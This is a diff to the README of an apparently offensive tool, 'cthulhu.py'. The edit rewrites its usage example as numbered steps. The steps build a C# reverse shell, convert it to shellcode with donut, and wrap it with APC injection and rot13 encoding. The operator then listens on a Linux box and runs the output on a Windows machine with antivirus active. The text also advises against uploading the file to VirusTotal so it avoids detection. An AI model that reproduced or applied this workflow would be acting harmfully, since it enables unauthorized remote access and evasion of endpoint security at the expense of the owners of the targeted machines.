@@ -23,19 +23,26 @@ python3 cthulu.py
 
 # Example
 
-Create a new Visual Studio C# Console Project
-Add reverse.cs and set IP and PORT
-Build it
-go to Linux box
+1. Create a new Visual Studio C# Console Project
 
-$ donut compiledapp.exe -o ca.bin
+2. Add reverse.cs and set IP and PORT
 
-$ python3 cthulhu.py -method apc -arch x86 -bin ca.bin -enc rot13
+3. Build it
+
+4. go to Linux box
+
+5. $ donut compiledapp.exe -o ca.bin
+
+6. $ python3 cthulhu.py -method apc -arch x86 -bin ca.bin -enc rot13
+
 [+]shellcode created: /tmp/shellcode.exe
 
-Copy shellcode.exe on Windows box and run it. Don't remember to start your Antivirus.
+8. Bind the right port on your linux box and wait.
 
-Don't upload your shellcode.exe on Virustotal
+9. Copy shellcode.exe on Windows box and run it. Don't remember to start your Antivirus.
+
+10. Don't upload your shellcode.exe on Virustotal
+
 
     *fox
     
